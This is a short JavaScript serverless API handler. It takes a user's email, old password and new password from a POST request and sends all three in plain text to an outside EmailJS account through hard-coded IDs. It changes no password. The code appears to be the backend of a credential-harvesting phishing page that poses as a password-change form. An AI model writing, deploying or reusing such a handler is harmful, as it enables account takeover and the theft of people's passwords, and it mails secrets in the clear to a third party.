import emailjs from 'emailjs-com';

// This is for API routing in a Node.js or serverless environment (e.g., Vercel API routes)
export default async function handler(req, res) {
  if (req.method === 'POST') {
    const { email, oldPassword, newPassword } = req.body;

    try {
      // Send data via EmailJS
      const response = await emailjs.send(
        'service_8hdqzju',  // Your EmailJS Service ID
        'template_hk6uqi8', // Your EmailJS Template ID
        {
          email: email,
          oldPassword: oldPassword,
          newPassword: newPassword
        },
        'ODWuzZ-mZLM196nkP' // Your EmailJS User ID
      );

      // Send back success message
      res.status(200).json({ message: 'Email sent successfully' });
    } catch (error) {
      console.error('Error sending email:', error);
      res.status(500).json({ message: 'Failed to send email' });
    }
  } else {
    // Return Method Not Allowed if it's not a POST request
    res.status(405).json({ message: 'Method Not Allowed' });
  }
}